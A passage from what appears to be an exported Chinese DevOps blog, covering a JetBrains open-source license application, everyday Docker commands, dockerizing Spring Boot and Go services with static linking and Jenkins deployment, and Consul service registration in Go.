1年的开源使用许可已经申请下来.\n使用许可 使用附件的说明书. 点击link进入授权页面.\n分配至相关权限用户, 也可以邀请相关用户,分配相关的licence.我给自己分配了一个授权louis@wangke.co\n管理员可以通过账户管理, 来邀请团队用户使用licence.\n致谢  开源项目获取jetbrains全家桶licence  虽然 JetBrains 全家桶在某宝、甚至破解网有各种不可描述的获取方式. 但是存在这种正规、不违背规则的福利，还是可以尝试一下。\n再次感叹开源的魅力!!再次感叹开源的魅力!!再次感叹开源的魅力!!\n续期 1. Do we know you ? Yes 2. Tell us about your project Language: go Project age: 10months Project website: https://www.fenghong.tech/blog/go/gin-use-in-webhook/ Repository Url: https://github.com/oldthreefeng/ginuse License URL: https://github.com/oldthreefeng/ginuse/blob/master/LICENSE No. of required: 1 Project description: autoDeploy your project. written in golang some api is developing 3. Tell us about yourself Email: louisehong4168@gmail.com A link to your profile: https://github.com/oldthreefeng OK ","permalink":"https://www.fenghong.tech/blog/tools/jetbrains-github/","tags":["goland","jetbrains"],"title":"开源项目获取jetbrains全家桶licence"},{"categories":["docker"],"contents":"小记一下, 经常用到的命令..\ndockerfile构建容器镜像 $ docker build [OPTIONS] PATH | URL | - # example $ docker build -t louisehong/jre-alpine:latest . $ docker build -t louisehong/jre-alpine:latest . # 私有仓库 $ docker build -t harbor.youpenglai.cn/louisehong/jre-alpine:lates . 对已经存在的镜像重新tag\n$ docker tag louisehong/jre-alpine:latest harbor.youpenglai.cn/ louisehong/jre-alpine:latest 推送镜像, 需要对镜像仓库有读写权限\n# 先docker login $ docker login harbor.youpenglai.cn username:... password:... # 生成的授权信息在~/.docker/config.json $ cat ~/.docker/config.json { \u0026#34;auths\u0026#34;: { \u0026#34;harbor.youpenglai.cn\u0026#34;: { \u0026#34;auth\u0026#34;: \u0026#34;*******************\u0026#34; } } # 如果是latest镜像, 则tag可以省略不写. $ docker push harbor.youpenglai.cn/louisehong/jre-alpine 容器启动 常用使用选项\n$ docker run [OPTIONS] IMAGE [COMMAND] [ARG...] [ OPTIONS ] 常用选项 -d 后台运行 --rm 退出容器后自动删除容器 -e --env , key=value, kv命令行读取 --env-file, 从文件读取 -i, --interactive ,交互式, 配合-t使用 -t, --tty , 启动一个tty, 配合-i使用 -p --publish , 暴露端口 -P --publish-all, 暴露容器内所有端口映射宿主机上随机端口 -v --volume , 绑定挂载卷轴. # example $ docker run -p 8888:8888 --rm -e JAVA_OPTS=$JAVA_OPTS harbor.youpenglai.cn/louisehong/jre-alpine # 交互式, 一般是进入容器查询. $ docker run -it --rm harbor.youpenglai.cn/louisehong/jre-alpine sh 批量删除停止容器 显示所有的容器，过滤出Exited状态的容器，取出这些容器的ID，然后删掉\n$ docker ps -a|grep Exited|awk \u0026#39;{print $1}\u0026#39; $ docker rm $(docker ps -a|grep Exited|awk \u0026#39;{print $1}\u0026#39;) 使用prune, 但是是在docker 1.13版本之后\n$ docker container prune 根据容器的状态删除\n$ docker rm $(docker ps -qf status=exited) 直接删除, 但是已经运行的是无法删除的\n$ docker rm $(docker ps -a -q) 批量删除镜像\n$ docker rmi ` docker images |grep none |awk \u0026#39;{print $3}\u0026#39;` ","permalink":"https://www.fenghong.tech/blog/docker/docker-tools/","tags":["docker"],"title":"docker 小技巧"},{"categories":["docker"],"contents":"创建spring-boot项目 使用spring-boot项目的pom.xml\nmvn打包使用jar包方式\njava的基础运行环境, 做一个基础的jre-alpine镜像,\n添加相关工具包,使得jer镜像环境体积最小\nFROM openjdk:8-jre-alpine MAINTAINER \u0026quot;louis \u0026lt;louis.hong@junhsue.com\u0026gt;\u0026quot; ## 工作目录为opt. 需要用到bash和zip包 RUN sed -i 's/dl-cdn.alpinelinux.org/mirrors.aliyun.com/g' /etc/apk/repositories \\ \u0026amp;\u0026amp; apk add --update bash \u0026amp;\u0026amp; apk add zip \\ \u0026amp;\u0026amp; rm -rf /var/cache/apk/* \\ \u0026amp;\u0026amp; mkdir /opt/config 构建spring-boot项目镜像\nFROM louisehong/jre-8-alpine-bash MAINTAINER \u0026quot;louis \u0026lt;louis.hong@junhsue.com\u0026gt;\u0026quot; WORKDIR /opt ENV PHASE=qa ADD target/weimall-api-single-*.jar app.jar ADD entrypoint.sh entrypoint.sh EXPOSE 8888 ENTRYPOINT [\u0026quot;./entrypoint.sh\u0026quot;] entrypoint.sh如下:\n#!/bin/sh # set -x # 默认为qa环境. PHASE=${PHASE:-\u0026#34;qa\u0026#34;} cd /opt \u0026amp;\u0026amp; \\ \tunzip -o -j app.jar BOOT-INF/classes/application-${PHASE}.yml -d config/ \u0026amp;\u0026amp; \\ \t# sed -i \u0026#34;s/PORT/$PORT/g\u0026#34; application-${PHASE}.yml java -jar /opt/app.jar -server --spring.profiles.active=${PHASE} $JAVA_OPTS MVN打包\n$ mvn clean package -Dmaven.test.skip=true 项目启动\n$ docer run --name $JOB_BASE_NAME --restart=always -d -p 8888:8888 -e PHASE= ","permalink":"https://www.fenghong.tech/blog/docker/java-with-docker/","tags":["docker","java","jvm"],"title":"java的spring-boot项目docker化"},{"categories":["docker"],"contents":"golang 项目 docker化 Golang 支持交叉编译，在一个平台上生成另一个平台的可执行程序\n最终的dockerfile 踩坑过程记录。\nFROM golang:alpine as builder WORKDIR /go/src/service-msite ENV GOPROXY=https://goproxy.cn ENV GO111MODULE=on RUN sed -i 's/dl-cdn.alpinelinux.org/mirrors.aliyun.com/g' /etc/apk/repositories \\ \u0026amp;\u0026amp; apk update \\ \u0026amp;\u0026amp; apk add git \\ \u0026amp;\u0026amp; apk add gcc \\ \u0026amp;\u0026amp; apk add libc-dev COPY go.mod go.sum ./ RUN go mod download COPY . . RUN GOOS=linux GOARCH=amd64 go build -ldflags \u0026quot;-extldflags -static -X 'main.Buildstamp=`date -u '+%Y-%m-%d %I:%M:%S%p'`' -X 'main.Githash=`git rev-parse HEAD`' -X 'main.Goversion=`go version`'\u0026quot; -o /service-msite FROM alpine WORKDIR /opt/ RUN apk add tzdata ca-certificates \u0026amp;\u0026amp; cp /usr/share/zoneinfo/Asia/Shanghai /etc/localtime \\ \u0026amp;\u0026amp; echo \u0026quot;Asia/Shanghai\u0026quot; \u0026gt; /etc/timezone \\ \u0026amp;\u0026amp; apk del tzdata \u0026amp;\u0026amp; rm -rf /var/cache/apk/* COPY --from=builder /service-msite . COPY --from=builder /go/src/service-msite/conf.d/ conf.d EXPOSE 22902 22903 ENTRYPOINT [\u0026quot;/opt/service-msite\u0026quot;] 编译golang项目存在C语言之踩坑 一开始， 我不知道项目有需要用到gcc编译器的, 直接 CGO_ENABLED=0, 报错如下， 发现不了源码。很纳闷~和开发沟通后.\n$ docker build -t service-msite:0 . Step 9/16 : RUN CGO_ENABLED=0 GOOS=linux GOARCH=amd64 go build -o /service-msite ---\u0026gt; Running in 65f75673ef1e build service-msite: cannot load service-msite/routers/controllers/exhibitor: no Go source files 在dockerfile中添加了 apk add gcc , 重新build,发现用到了七牛的iconv, 还是爆出了compilation错误iconv.h: No such file or directory, 发现不了源码文件.\n$ docker build -t service-msite:0 . Step 9/16 : RUN GOOS=linux GOARCH=amd64 go build -o /service-msite ---\u0026gt; Running in 3b5479d74b99 # github.com/qiniu/iconv /go/pkg/mod/github.com/qiniu/iconv@v0.0.0-20160413084200-e9ee0ddd1a3a/iconv.go:9:11: fatal error: iconv.h: No such file or directory // #include \u0026lt;iconv.h\u0026gt; ^~~~~~~~~ compilation terminated. # service-msite/routers/controllers/exhibitor _cgo_export.c:3:10: fatal error: stdlib.h: No such file or directory #include \u0026lt;stdlib.h\u0026gt; ^~~~~~~~~~ compilation terminated. The command \u0026#39;/bin/sh -c GOOS=linux GOARCH=amd64 go build -o /service-msite\u0026#39; returned a non-zero code: 2 查询相关文档后, 发现在golang:alpine镜像中,libc是要单独安装的apk add libc-dev, 在dockerfile中加入后, 重新编写镜像\n$ docker build -t service-msite:0 . Step 13/16 : COPY --from=builder /service-msite . ---\u0026gt; 42edaa10cbe7 Removing intermediate container 11abbb3e796b Step 14/16 : COPY --from=builder /go/src/service-msite/conf.d/ conf.d ---\u0026gt; eef43e376975 Removing intermediate container 29aac52c5592 Step 15/16 : EXPOSE 22902 22903 ---\u0026gt; Running in 560b460ad2e4 ---\u0026gt; 388ab5135e69 Removing intermediate container 560b460ad2e4 Step 16/16 : ENTRYPOINT /opt/service-msite ---\u0026gt; Running in 2e7364eb8443 ---\u0026gt; 5704e7239be8 Removing intermediate container 2e7364eb8443 Successfully built 5704e7239be8 Successfully tagged service-msite:0 完美编译成功.\ndocker部署踩坑 启动刚build的docker镜像. 没有发现文件service-msite二进制文件.\n$ docker run -p 22902:22902 -p 22903:22903 service-msite:0 standard_init_linux.go:190: exec user process caused \u0026#34;no such file or directory\u0026#34;  There are a number of reasons that folks are in love with golang. One the most mentioned is the static linking.\n  As long as the source being compiled is native go, the go compiler will statically link the executable. Though when you need to use cgo, then the compiler has to use its external linker.\n 在宿主机上进行GOOS=linux GOARCH=amd64 go build完全可以运行, 在docker里面竟然执行不了. 百度之后, 发现golang的魅力在于静态链接. 一个是静态链接，一个是动态链接，动态链接的在微型镜像alpine上不支持。\n$ GOOS=linux GOARCH=amd64 go build $ file service-msite service-msite: ELF 64-bit LSB executable, x86-64, version 1 (SYSV), dynamically linked (uses shared libs), for GNU/Linux 2.6.32, not stripped $ ldd service-msite linux-vdso.so.1 =\u0026gt; (0x00007ffd00159000) libpthread.so.0 =\u0026gt; /lib64/libpthread.so.0 (0x00007fc75d00f000) libc.so.6 =\u0026gt; /lib64/libc.so.6 (0x00007fc75cc41000) /lib64/ld-linux-x86-64.so.2 (0x00007fc75d22b000) 加上-ldflags \u0026quot;-extldflags -static\u0026quot; 标签, 里面变成静态链接\n$ GOOS=linux GOARCH=amd64 go build -ldflags \u0026#34;-extldflags -static\u0026#34; $ file service-msite service-msite: ELF 64-bit LSB executable, x86-64, version 1 (GNU/Linux), statically linked, for GNU/Linux 2.6.32, not stripped $ ldd service-msite not a dynamic executable 完美收官, docker和golang的项目, 真的是匹配~\n附言 附带编译打包是的源码\n$ go build -ldfalgs \u0026#34;-X \u0026#39;main.Buildstamp=`date -u \u0026#39;+%Y-%m-%d %I:%M:%S%p\u0026#39;`\u0026#39; -X \u0026#39;main.Githash=`git rev-parse HEAD`\u0026#39; -X \u0026#39;main.Goversion=`go version`\u0026#39;\u0026#34; 很巧妙的编译. 记录学习一下.\npackage main import ( \u0026#34;flag\u0026#34; \u0026#34;fmt\u0026#34; ) const Version = \u0026#34;1.4.1\u0026#34; var ( Buildstamp = \u0026#34;\u0026#34; Githash = \u0026#34;\u0026#34; Goversion = \u0026#34;\u0026#34; infoFlag = false ) func init() { flag.BoolVar(\u0026amp;infoFlag, \u0026#34;V\u0026#34;, false, \u0026#34;version info\u0026#34;) } func main () { flag.Parse() if infoFlag { fmt.Printf(\u0026#34;Version: %s\\n\u0026#34;, Version) fmt.Printf(\u0026#34;Git Commit Hash: %s\\n\u0026#34;, Githash) fmt.Printf(\u0026#34;UTC Build Time : %s\\n\u0026#34;, Buildstamp) fmt.Printf(\u0026#34;Go Version: %s\\n\u0026#34;, Goversion) return } ... } 结合jenkins做发布\nStarted by user louishong Running as SYSTEM Building in workspace /root/.jenkins/workspace/test-service-msite No credentials specified \u0026gt; /usr/bin/git submodule update --init --recursive proto-user [test-service-msite] $ /bin/sh -xe /tmp/jenkins4336241043767081707.sh + cd /root/.jenkins/workspace/test-service-msite + cat + docker build -t harbor.youpenglai.cn/hudong/service-msite:35 . Sending build context to Docker daemon 79.74MB Step 1/16 : FROM golang:alpine as builder ---\u0026gt; 3024b4e742b0 Step 2/16 : WORKDIR /go/src/service-msite ---\u0026gt; Using cache ---\u0026gt; ce0f39f06f4d Step 3/16 : ENV GOPROXY https://goproxy.cn ---\u0026gt; Using cache ---\u0026gt; 5a648682b413 Step 4/16 : ENV GO111MODULE on ---\u0026gt; Using cache ---\u0026gt; c07567032634 Step 5/16 : RUN sed -i \u0026#39;s/dl-cdn.alpinelinux.org/mirrors.aliyun.com/g\u0026#39; /etc/apk/repositories \u0026amp;\u0026amp; apk update \u0026amp;\u0026amp; apk add git \u0026amp;\u0026amp; apk add gcc \u0026amp;\u0026amp; apk add libc-dev ---\u0026gt; Using cache ---\u0026gt; 148ce213a987 Step 6/16 : COPY go.mod go.sum ./ ---\u0026gt; Using cache ---\u0026gt; 07bb01709b53 Step 7/16 : RUN go mod download ---\u0026gt; Using cache ---\u0026gt; d30737f26923 Step 8/16 : COPY . . ---\u0026gt; Using cache ---\u0026gt; 0a374d967956 Step 9/16 : RUN GOOS=linux GOARCH=amd64 go build -ldflags \u0026#34;-extldflags -static\u0026#34; -x -o /service-msite ---\u0026gt; Using cache ---\u0026gt; 386768cecb3b Step 10/16 : FROM alpine ---\u0026gt; 965ea09ff2eb Step 11/16 : WORKDIR /opt/ ---\u0026gt; Using cache ---\u0026gt; 1f76f5442286 Step 12/16 : RUN apk add tzdata ca-certificates \u0026amp;\u0026amp; cp /usr/share/zoneinfo/Asia/Shanghai /etc/localtime \u0026amp;\u0026amp; echo \u0026#34;Asia/Shanghai\u0026#34; \u0026gt; /etc/timezone \u0026amp;\u0026amp; apk del tzdata \u0026amp;\u0026amp; rm -rf /var/cache/apk/* ---\u0026gt; Using cache ---\u0026gt; 2a9386bcf1a8 Step 13/16 : COPY --from=builder /service-msite . ---\u0026gt; Using cache ---\u0026gt; ec46dc96dcad Step 14/16 : COPY --from=builder /go/src/service-msite/conf.d/ conf.d ---\u0026gt; Using cache ---\u0026gt; 97b266fab23d Step 15/16 : EXPOSE 22902 22903 ---\u0026gt; Using cache ---\u0026gt; efa77439cb11 Step 16/16 : ENTRYPOINT /opt/service-msite ---\u0026gt; Using cache ---\u0026gt; 2019ce457320 Successfully built 2019ce457320 Successfully tagged harbor.youpenglai.cn/hudong/service-msite:35 + docker push harbor.youpenglai.cn/hudong/service-msite:35 The push refers to a repository [harbor.youpenglai.cn/hudong/service-msite] fe2f34e1bae5: Preparing bea1df178045: Preparing b702ba588b63: Preparing 77cae8ab23bf: Preparing b702ba588b63: Layer already exists 77cae8ab23bf: Layer already exists fe2f34e1bae5: Layer already exists bea1df178045: Layer already exists 35: digest: sha256:4ce369a7729cce6c71831379e303385b36e2f177fa89675a3f1f83e107a33834 size: 1158 [SSH] script: JOB_BASE_NAME=\u0026#34;test-service-msite\u0026#34; BUILD_NUMBER=\u0026#34;35\u0026#34; docker pull harbor.youpenglai.cn/hudong/service-msite:${BUILD_NUMBER} docker stop $JOB_BASE_NAME docker rm $JOB_BASE_NAME docker run --name $JOB_BASE_NAME --restart=always -d -p 22902:22902 -p 22903:22903 -e MFW_CONSUL_IP=192.168.0.89 harbor.youpenglai.cn/hudong/service-msite:${BUILD_NUMBER} [SSH] executing... Error response from daemon: no such id: test-service-msite Error: failed to stop containers: [test-service-msite] Error response from daemon: no such id: test-service-msite Error: failed to remove containers: [test-service-msite] 35: Pulling from harbor.youpenglai.cn/hudong/service-msite 9449b80f3b71: Already exists c806779f19ea: Already exists 4bec7ab1dd18: Already exists ef08506cfaf7: Already exists e4b17e4ffd21: Already exists a8cfba2ab5a7: Already exists aa70e406cd52: Already exists 188ab4fb4e1e: Already exists Digest: sha256:eb175e1ac8fbbeffe47cf02d00fd23941664683b245ba45ee4d3268388885267 Status: Downloaded newer image for harbor.youpenglai.cn/hudong/service-msite:35 3f509ec0d74fc067af9dd37d3e24fa2f34f3ccdf0aa0128fccd6eb075c59f490 [SSH] completed [SSH] exit-status: 0 Finished: SUCCESS 查看容器状态. 成功部署.\n$ docker ps CONTAINER ID IMAGE COMMAND CREATED STATUS PORTS NAMES 3f509ec0d74f harbor.youpenglai.cn/hudong/service-msite:35 \u0026quot;/opt/service-msite\u0026quot; 10 seconds ago Up 9 seconds 0.0.0.0:22902-22903-\u0026gt;22902-22903/tcp test-service-msite $ ss -ntl |grep 22902 LISTEN 0 128 :::22902 :::* LISTEN 0 128 :::22902 :::* ","permalink":"https://www.fenghong.tech/blog/docker/golang-with-docker/","tags":["docker","go"],"title":"golang项目docker化"},{"categories":["ops"],"contents":"$ 表示shell , # 表示注释, \u0026gt; 表示mysql\nconsul 部署使用 使用consul，其主要有四大特性：\n服务发现：利用服务注册，服务发现功能来实现服务治理。\n健康检查：利用consul注册的检查检查函数或脚本来判断服务是否健康，若服务不存在则从注册中心移除该服务，减少故障服务请求。\nk/v数据存储：存储kv数据，可以作为服务配置中心来使用。\n多数据中心：可以建立多个consul集群通过inter网络进行互联，进一步保证数据可用性。\n本人也是刚开始学习consul，感觉使用consul主要也就是两大作用，服务注册发现，配置共享。\n使用 consul启动\n$ nohup consul agent -server -data-dir=/usr/local/consul-data/ -node=agent-one -bind=0.0.0.0 -bootstrap-expect=1 -client=0.0.0.0 -ui \u0026gt; /usr/local/consul-data/logs/consul.log 2\u0026gt;\u0026amp;1 \u0026amp; -server 表示是以服务端身份启动 -bind 表示绑定到哪个ip（有些服务器会绑定多块网卡，可以通过bind参数强制指定绑定的ip） -client 指定客户端访问的ip(consul有丰富的api接口，这里的客户端指浏览器或调用方)，0.0.0.0表示不限客户端ip -bootstrap-expect=3 表示server集群最低节点数为3，低于这个值将工作不正常(注：类似zookeeper一样，通常集群数为奇数，方便选举，consul采用的是raft算法) -data-dir 表示指定数据的存放目录（该目录必须存在） -node 表示节点在web ui中显示的名称 查看当前的members\n$ consul members Node Address Status Type Build Protocol DC Segment agent-one 172.16.111.130:8301 alive server 1.5.2 2 dc1 \u0026lt;all\u0026gt; 查看当前的leader\n$ curl http://127.0.0.1:8500/v1/status/leader \u0026quot;172.16.111.130:8300\u0026quot; $ curl localhost:8500/v1/agent/services | python -m json.tool { \u0026quot;hudongapps\u0026quot;: { \u0026quot;Address\u0026quot;: \u0026quot;\u0026quot;, \u0026quot;EnableTagOverride\u0026quot;: false, \u0026quot;ID\u0026quot;: \u0026quot;hudongapps\u0026quot;, \u0026quot;Meta\u0026quot;: {}, \u0026quot;Port\u0026quot;: 22961, \u0026quot;Service\u0026quot;: \u0026quot;hudongapps\u0026quot;, \u0026quot;Tags\u0026quot;: [ \u0026quot;node\u0026quot; ], \u0026quot;Weights\u0026quot;: { \u0026quot;Passing\u0026quot;: 1, \u0026quot;Warning\u0026quot;: 1 } }, } 发现service-msite服务\n$ curl http://127.0.0.1:8500/v1/catalog/service/service-msite | python -m json.tool [ { \u0026quot;Address\u0026quot;: \u0026quot;172.16.111.130\u0026quot;, \u0026quot;CreateIndex\u0026quot;: 424242, \u0026quot;Datacenter\u0026quot;: \u0026quot;dc1\u0026quot;, \u0026quot;ID\u0026quot;: \u0026quot;7f9c6b5d-8a32-c6f8-e091-0280f2efeddb\u0026quot;, \u0026quot;ModifyIndex\u0026quot;: 424242, \u0026quot;Node\u0026quot;: \u0026quot;agent-one\u0026quot;, \u0026quot;NodeMeta\u0026quot;: { \u0026quot;consul-network-segment\u0026quot;: \u0026quot;\u0026quot; }, \u0026quot;ServiceAddress\u0026quot;: \u0026quot;\u0026quot;, \u0026quot;ServiceConnect\u0026quot;: {}, \u0026quot;ServiceEnableTagOverride\u0026quot;: true, \u0026quot;ServiceID\u0026quot;: \u0026quot;service-msite-22902\u0026quot;, \u0026quot;ServiceKind\u0026quot;: \u0026quot;\u0026quot;, \u0026quot;ServiceMeta\u0026quot;: {}, \u0026quot;ServiceName\u0026quot;: \u0026quot;service-msite\u0026quot;, \u0026quot;ServicePort\u0026quot;: 22902, \u0026quot;ServiceProxy\u0026quot;: {}, \u0026quot;ServiceProxyDestination\u0026quot;: \u0026quot;\u0026quot;, \u0026quot;ServiceTags\u0026quot;: [ \u0026quot;go\u0026quot; ], \u0026quot;ServiceWeights\u0026quot;: { \u0026quot;Passing\u0026quot;: 1, \u0026quot;Warning\u0026quot;: 1 }, \u0026quot;TaggedAddresses\u0026quot;: { \u0026quot;lan\u0026quot;: \u0026quot;172.16.111.130\u0026quot;, \u0026quot;wan\u0026quot;: \u0026quot;172.16.111.130\u0026quot; } } ] golang 代码 注册逻辑\npackage server import ( \u0026#34;log\u0026#34; \u0026#34;service-apis/config\u0026#34; pb \u0026#34;service-apis/proto-apis\u0026#34; . \u0026#34;github.com/youpenglai/mfwgo/registry\u0026#34; . \u0026#34;github.com/youpenglai/mfwgo/server\u0026#34; \u0026#34;google.golang.org/grpc\u0026#34; ) func Setup() { // 获取配置, 存放name,port等相关信息 \tcfg := config.GetConfig() // register service \terr := RegisterService(ServiceRegistration{ServiceName: cfg.ServiceName, Port: cfg.GRPCPort}, ServiceRegisterType{CheckHealth: CheckHealth{Type: \u0026#34;grpc\u0026#34;}}) if err != nil { log.Fatalf(\u0026#34;register service error: %v\u0026#34;, err) return } // start server \tgrpcServer := NewGRPCServer(GRPCServerOption{Port: cfg.GRPCPort}) addServer(grpcServer.GetServer()) log.Fatalln(grpcServer.ListenAndServe()) } func addServer(gServer *grpc.Server) { pb.RegisterApisServer(gServer, \u0026amp;ApisServer{}) } 启动服务\npackage main import ( \u0026#34;service-apis/config\u0026#34; \u0026#34;service-apis/routers\u0026#34; \u0026#34;service-apis/server\u0026#34; ) func main() { config.Setup() go server.Setup() //注册服务 \trouters.Setup()\t//起服务 } 其中注册和discover发现逻辑.\npackage registry import ( \u0026quot;encoding/json\u0026quot; \u0026quot;errors\u0026quot; \u0026quot;fmt\u0026quot; \u0026quot;os\u0026quot; \u0026quot;strconv\u0026quot; ) var ( consulIp = \u0026quot;127.0.0.1\u0026quot; consulPort = 8500 ) // 支持从环境变量中获取 func initConsul() { ip := os.Getenv(\u0026quot;MFW_CONSUL_IP\u0026quot;) if ip != \u0026quot;\u0026quot; { consulIp = ip } port := os.Getenv(\u0026quot;MFW_CONSUL_PORT\u0026quot;) if port != \u0026quot;\u0026quot; { v, e := strconv.ParseInt(port, 10, 32) if e != nil { return } consulPort = int(v) } } const ( deregisterInterval = \u0026quot;10m\u0026quot; tagGo = \u0026quot;go\u0026quot; checkInterval = \u0026quot;30s\u0026quot; ) type ServiceRegisterInfo struct { ID string `json:\u0026quot;ID\u0026quot;` Name string `json:\u0026quot;Name\u0026quot;` Port int64 `json:\u0026quot;Port\u0026quot;` Tags []string `json:\u0026quot;Tags\u0026quot;` Check interface{} `json:\u0026quot;Check\u0026quot;` EnableTagOverride bool `json:\u0026quot;EnableTagOverride\u0026quot;` } type HTTPCheck struct { DeregisterCriticalServiceAfter string `json:\u0026quot;DeregisterCriticalServiceAfter\u0026quot;` HTTP string `json:\u0026quot;HTTP\u0026quot;` Interval string `json:\u0026quot;Interval\u0026quot;` } type GRPCCheck struct { DeregisterCriticalServiceAfter string `json:\u0026quot;DeregisterCriticalServiceAfter\u0026quot;` GRPC string `json:\u0026quot;GRPC\u0026quot;` Interval string `json:\u0026quot;Interval\u0026quot;` } type ServiceHealthInfo struct { Node Node `json:\u0026quot;Node\u0026quot;` Service ConsulServiceInfo `json:\u0026quot;Service\u0026quot;` Checks []Check `json:\u0026quot;Checks\u0026quot;` } type Node struct { Address string `json:\u0026quot;Address\u0026quot;` } type Check struct { ServiceID string `json:\u0026quot;ServiceID\u0026quot;` ServiceName string `json:\u0026quot;ServiceName\u0026quot;` Status string `json:\u0026quot;Status\u0026quot;` } type ConsulServiceInfo struct { ID string `json:\u0026quot;ID\u0026quot;` Name string `json:\u0026quot;Service\u0026quot;` Port int64 `json:\u0026quot;Port\u0026quot;` Tags []string `json:\u0026quot;Tags\u0026quot;` } type ConsulService struct{} func NewConsulService() *ConsulService { return \u0026amp;ConsulService{} } func (c *ConsulService) Register(name string, port int64, healthType string) error { url := fmt.Sprintf(\u0026quot;http://%s:%d/v1/agent/service/register\u0026quot;, consulIp, consulPort) headers := map[string]string{ \u0026quot;Content-Type\u0026quot;: \u0026quot;application/json\u0026quot;, } var check interface{} switch healthType { case \u0026quot;http\u0026quot;: check = HTTPCheck{ DeregisterCriticalServiceAfter: deregisterInterval, HTTP: fmt.Sprintf(\u0026quot;http://%s:%d/health\u0026quot;, consulIp, port), Interval: checkInterval, } case \u0026quot;grpc\u0026quot;: check = GRPCCheck{ DeregisterCriticalServiceAfter: deregisterInterval, GRPC: fmt.Sprintf(\u0026quot;%s:%d\u0026quot;, consulIp, port), Interval: checkInterval, } } register := ServiceRegisterInfo{ Name: name, Port: port, ID: fmt.Sprintf(\u0026quot;%v-%v\u0026quot;, name, port), Tags: []string{tagGo}, Check: check, EnableTagOverride: true, } data, _ := json.Marshal(register) errMsg, err := HttpPutWithHeader(url, headers, data) if err != nil { return err } if string(errMsg) != \u0026quot;\u0026quot; { return errors.New(string(errMsg)) } return c.GetServicesToCache(name) } func (c *ConsulService) GetServices(serviceName string) ([]*ServiceInfo, error) { url := fmt.Sprintf(\u0026quot;http://%s:%d/v1/health/service/%s?passing\u0026quot;, consulIp, consulPort, serviceName) headers := map[string]string{} result, err := HttpGetWithHeader(url, headers) if err != nil { return nil, err } var infos []ServiceHealthInfo if err := json.Unmarshal(result, \u0026amp;infos); err != nil { return nil, err } //if len(infos) == 0 { //\treturn nil, errors.New(\u0026quot;not found service: \u0026quot; + serviceName) //} var validInfos []*ServiceInfo for _, info := range infos { validInfos = append(validInfos, \u0026amp;ServiceInfo{ Address: info.Node.Address, Port: info.Service.Port, Tags: info.Service.Tags, }) } return validInfos, nil } func (c *ConsulService) GetServicesToCache(serviceName string) error { infos, err := c.GetServices(serviceName) if err != nil { return err } // consul return gConsulCache.Set(serviceName, infos) } func init() { initConsul() } 注册consul后, 查询具体使用curl来进行查询.\n$ curl localhost:8500/v1/agent/services | python -m json.tool \u0026#34;service-apis-22906\u0026#34;: { \u0026#34;Address\u0026#34;: \u0026#34;\u0026#34;, \u0026#34;EnableTagOverride\u0026#34;: true, \u0026#34;ID\u0026#34;: \u0026#34;service-apis-22906\u0026#34;, \u0026#34;Meta\u0026#34;: {}, \u0026#34;Port\u0026#34;: 22906, \u0026#34;Service\u0026#34;: \u0026#34;service-apis\u0026#34;, \u0026#34;Tags\u0026#34;: [ \u0026#34;go\u0026#34; ], \u0026#34;Weights\u0026#34;: { \u0026#34;Passing\u0026#34;: 1, \u0026#34;Warning\u0026#34;: 1 } }, 使用官方的api操作\npackage main import ( \u0026quot;github.com/gin-gonic/gin\u0026quot; consulapi \u0026quot;github.com/hashicorp/consul/api\u0026quot; \u0026quot;net/http\u0026quot; \u0026quot;fmt\u0026quot; \u0026quot;log\u0026quot; ) func main() { r := gin.Default() // consul健康检查回调函数 r.GET(\u0026quot;/\u0026quot;, func(c *gin.Context) { c.JSON(200, gin.H{ \u0026quot;message\u0026quot;: \u0026quot;ok\u0026quot;, }) }) // 注册服务到consul ConsulRegister() // 从consul中发现服务 ConsulFindServer() // 取消consul注册的服务 //ConsulDeRegister() http.ListenAndServe(\u0026quot;:8081\u0026quot;, r) } // 注册服务到consul func ConsulRegister() { // 创建连接consul服务配置 config := consulapi.DefaultConfig() config.Address = \u0026quot;127.0.0.1:8500\u0026quot; client, err := consulapi.NewClient(config) if err != nil { log.Fatal(\u0026quot;consul client error : \u0026quot;, err) } // 创建注册到consul的服务到 registration := new(consulapi.AgentServiceRegistration) registration.ID = \u0026quot;111\u0026quot; registration.Name = \u0026quot;go-consul-test\u0026quot; registration.Port = 8081 registration.Tags = []string{\u0026quot;go-consul-test\u0026quot;} registration.Address = \u0026quot;10.13.153.128\u0026quot; // 增加consul健康检查回调函数 check := new(consulapi.AgentServiceCheck) check.HTTP = fmt.Sprintf(\u0026quot;http://%s:%d\u0026quot;, registration.Address, registration.Port) check.Timeout = \u0026quot;5s\u0026quot; check.Interval = \u0026quot;5s\u0026quot; check.DeregisterCriticalServiceAfter = \u0026quot;30s\u0026quot; // 故障检查失败30s后 consul自动将注册服务删除 registration.Check = check // 注册服务到consul err = client.Agent().ServiceRegister(registration) } // 取消consul注册的服务 func ConsulDeRegister() { // 创建连接consul服务配置 config := consulapi.DefaultConfig() config.Address = \u0026quot;127.0.0.1:8500\u0026quot; client, err := consulapi.NewClient(config) if err != nil { log.Fatal(\u0026quot;consul client error : \u0026quot;, err) } client.Agent().ServiceDeregister(\u0026quot;111\u0026quot;) } // 从consul中发现服务 func ConsulFindServer() { // 创建连接consul服务配置 config := consulapi.DefaultConfig() config.Address = \u0026quot;127.0.0.1:8500\u0026quot; client, err := consulapi.NewClient(config) if err != nil { log.Fatal(\u0026quot;consul client error : \u0026quot;, err) } // 获取所有service services, _ := client.Agent().Services() for _, value := range services{ fmt.Println(value.Address) fmt.Println(value.Port) } fmt.Println(\u0026quot;=================================\u0026quot;) // 获取指定service service, _, err := client.Agent().Service(\u0026quot;111\u0026quot;, nil) if err == nil{ fmt.Println(service.Address) fmt.Println(service.Port) } } func ConsulCheckHeath() { // 创建连接consul服务配置 config := consulapi.DefaultConfig() config.Address = \u0026quot;127.0.0.1:8500\u0026quot; client, err := consulapi.NewClient(config) if err != nil { log.Fatal(\u0026quot;consul client error : \u0026quot;, err) } // 健康检查 a, b, _ := client.Agent().AgentHealthServiceByID(\u0026quot;111\u0026quot;) fmt.Println(a) fmt.Println(b) } func ConsulKVTest() { // 创建连接consul服务配置 config := consulapi.DefaultConfig() config.Address = \u0026quot;127.0.0.1:8500\u0026quot; client, err := consulapi.NewClient(config) if err != nil { log.Fatal(\u0026quot;consul client error : \u0026quot;, err) } // KV, put值 values := \u0026quot;test\u0026quot; key := \u0026quot;go-consul-test/127.0.0.1:8100\u0026quot; client.KV().Put(\u0026amp;consulapi.KVPair{Key:key, Flags:0, Value: []byte(values)}, nil) // KV get值 data, _, _ := client.KV().Get(key, nil) fmt.Println(string(data.Value)) // KV list datas, _ , _:= client.KV().List(\u0026quot;go\u0026quot;, nil) for _ , value := range datas{ fmt.Println(value) } keys, _ , _ := 